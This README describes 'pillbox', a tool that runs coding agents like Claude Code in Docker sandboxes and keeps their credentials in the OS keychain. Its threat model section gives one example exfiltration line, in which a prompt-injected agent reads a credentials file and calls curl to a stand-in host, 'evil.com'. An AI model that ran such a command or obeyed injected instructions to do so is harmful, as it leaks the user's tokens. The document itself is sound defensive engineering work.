# pillbox

**Sandboxed coding agents with one-command auth.** Think `gh auth login` for
Claude Code (and, soon, Codex / opencode).

```sh
pillbox claude login           # one-shot OAuth flow in a sandbox; creds → OS keychain
pillbox claude run             # sandbox + claude with creds mounted in
pillbox auth list              # what's stored
pillbox auth rm claude         # forget it
```

## Why

Coding agents need credentials. Running them on bare metal means a misconfigured
prompt / poisoned doc / bad plugin can read whatever's in your shell environment.
Pillbox runs each agent inside a fresh Docker sandbox with **only** the
credential it needs to function, stored in your OS keychain (macOS Keychain,
Linux libsecret, Windows DPAPI) — not as a flat file under `~`.

The login flow is itself sandboxed: `pillbox claude login` runs `claude /login`
in a throwaway container, captures the resulting `.credentials.json`, and
destroys the container before storing the credential.

## Threat model (be specific)

Pillbox **does** defend against:
- Agent inadvertently reading host environment variables or `~/.claude` /
  `~/.codex` / `~/.gh` outside its sandbox.
- Credentials persisting as cleartext files on disk (they're in the OS keychain).
- The login flow itself pulling in host state (the login container is fresh
  each time).

Pillbox **does not** defend against:
- An agent with shell access exfiltrating the credentials it was *given*. If a
  prompt-injected agent runs `cat ~/.claude/.credentials.json && curl evil.com`,
  the token leaves. The fix for that is the v0.2 vault tier — out of scope here.
- Compromised Docker daemon, escape from container, or kernel-level attacks.
  Pillbox uses standard Docker isolation, not microVMs (v0.3 ships a `--strict`
  mode that uses Gondolin microVMs).
- Lost device with an unlocked OS keychain. The credential is as safe as your
  laptop.

## Status

Pre-alpha. v0.1 supports Claude Code on macOS only. Linux and Windows work
*in theory* (keychain backends + Docker exist) but haven't been tested.

## Roadmap

- **v0.1** (this) — Claude Code login + run, macOS keychain, Docker sandbox
- **v0.2** — Codex + opencode adapters; vault tier (stub creds + egress proxy
  swap for API keys + GitHub PATs); `pillbox auth export/import` for cross-
  machine sync
- **v0.3** — Gondolin microVM backend via `pillbox run --strict`
- **v0.4** — Per-project config (`pillbox.toml`), per-run `--with <secret>`
  scoping

## Build (v0.1 requires the lum-built runner image)

```sh
# Build the runner image (until pillbox publishes its own to GHCR)
cd ~/code/lum && bun run build:runtime-image:pillbox

# Build + install the CLI
cd ~/code/pillbox && cargo install --path .

# Use it
pillbox claude login
pillbox claude run
```

## License

MIT OR Apache-2.0
